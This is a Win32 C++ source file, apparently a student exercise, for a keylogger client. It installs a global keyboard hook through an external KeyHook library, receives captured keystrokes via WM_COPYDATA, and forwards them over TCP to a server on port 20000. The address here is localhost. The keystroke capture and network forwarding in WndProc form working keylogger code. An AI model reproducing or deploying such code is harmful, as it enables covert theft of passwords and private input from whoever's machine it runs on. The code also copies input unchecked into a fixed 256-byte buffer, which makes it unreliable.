// HOOK本地键盘实现.cpp : 定义应用程序的入口点。
//
#include<winsock2.h>

#include "framework.h"
#include "HOOK本地键盘实现.h"
#include "..\\..\\MFC\\HOOK本地键盘记录实现\\TCP包.h"
#define MAX_LOADSTRING 100
#pragma warning(disable:4996)
#pragma comment(lib,"ws2_32.lib")

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);


#pragma comment(lib,"..\\..\\bin\\KeyHook.lib")
BOOL MyKeyHook(HWND hwnd);
SOCKET s;

int InitSocketAndConnect() {

    //windows 很特殊需要单独调用 windows API 来进行网络初始化和反初始化
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(2, 2);
    //初始化网络
    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        /* Tell the user that we could not find a usable */
        /* WinSock DLL.                                  */
        return -1;
    }


    //1.socket 创建一个套接字
   //2.SOCKET socket函数的返回值，类似于handle
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {

        
        return -1;
    }


    //挑选一个本机其他软件没有使用的端口

    sockaddr_in si;   //sockaddr_in结构体，用于描述IP和端口，是sockaddr的升级版
    int nLength = sizeof(sockaddr_in);
    si.sin_port = htons(20000); //h:host to n:network s:short 表示本地小端数据 转网络大端数据  还可以ntohs 表示网络大端转本地小端   
    si.sin_family = AF_INET;  //固定写死的套路
    si.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");  //127.0.0.1只连接本地电脑 说明服务端和客户端在同一台电脑 连谁就填谁
    int Ret = connect(s, (sockaddr*)&si, nLength);

    if (Ret == SOCKET_ERROR) {

        
        return -1;
    }
    return 0;
}






int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: 在此处放置代码。
    //初始化网络
    int ret = InitSocketAndConnect();
    if (ret == -1) {

        OutputDebugStringA("InitSocketAndConnect error\n");
    }
    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_HOOK, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }



    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_HOOK));

    MSG msg;

    // 主消息循环:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}






//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_HOOK));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_HOOK);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   MyKeyHook(hWnd);

   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {

    case WM_COPYDATA:
    {
        char bufer[256] = { 0 };
        PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;
        OutputDebugStringA((LPCSTR)pcds->lpData);
        const char* c = (const char*)pcds->lpData;
        TCP* t = (TCP*)bufer;
        t->dwTcp = TCP_KEY_CLIENT;
        t->nLength = strlen(c);
        memcpy(t->bufer, c, strlen(c));
        send(s, (const char*)t, t->nLength + 8, 0);

    }
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // 分析菜单选择:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: 在此处添加使用 hdc 的任何绘图代码...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
